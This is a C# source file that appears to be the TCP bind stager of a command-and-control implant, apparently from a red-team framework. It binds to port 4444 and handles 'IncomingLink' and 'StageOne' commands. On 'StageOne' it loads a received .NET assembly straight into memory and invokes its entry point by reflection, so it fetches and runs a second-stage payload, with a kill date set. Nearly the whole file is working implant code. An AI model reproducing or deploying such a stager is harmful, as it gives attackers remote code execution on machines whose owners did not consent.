using System;
using System.Reflection;
using System.Text;

class AgentStager
{
    static StagerStatus StagerStatus = StagerStatus.Staging;

    static string AgentID;

    static readonly string BindAddress = "127.0.0.1";
    static readonly int BindPort = int.Parse("4444");

    static DateTime KillDate = DateTime.Parse("25/09/2030 00:00:01");

    public AgentStager()
    {
        Execute();
    }

    static void Main(string[] args)
    {
        new AgentStager();
    }

    public static void Execute()
    {
        AgentID = Misc.GeneratePseudoRandomString(8);

        var crypto = new CryptoController();

        try
        {
            var commModule = new TcpCommModule(AgentID, BindAddress, BindPort);
            commModule.Start(crypto);
            

            while (StagerStatus == StagerStatus.Staging)
            {
                if (commModule.RecvData(out AgentMessage message))
                {
                    if (message.Data.Command.Equals("IncomingLink", StringComparison.OrdinalIgnoreCase))
                    {
                        commModule.QueueStageRequest(Encoding.UTF8.GetString(message.Data.Data));
                    }
                    else if (message.Data.Command.Equals("StageOne", StringComparison.OrdinalIgnoreCase))
                    {
                        StagerStatus = StagerStatus.Staged;
                        commModule.Stop();

                        var asm = Assembly.Load(message.Data.Data);
                        var type = asm.GetType("AgentStage");
                        var instance = Activator.CreateInstance(type);
                        type.InvokeMember(
                            "TcpEntryPoint",
                            BindingFlags.Public | BindingFlags.Static | BindingFlags.InvokeMethod,
                            null,
                            instance,
                            new object[] { AgentID, KillDate, BindAddress, BindPort });
                    }
                }
            }
        }
        catch (Exception e)
        {
            Console.Error.WriteLine(e.StackTrace);
        }
    }
}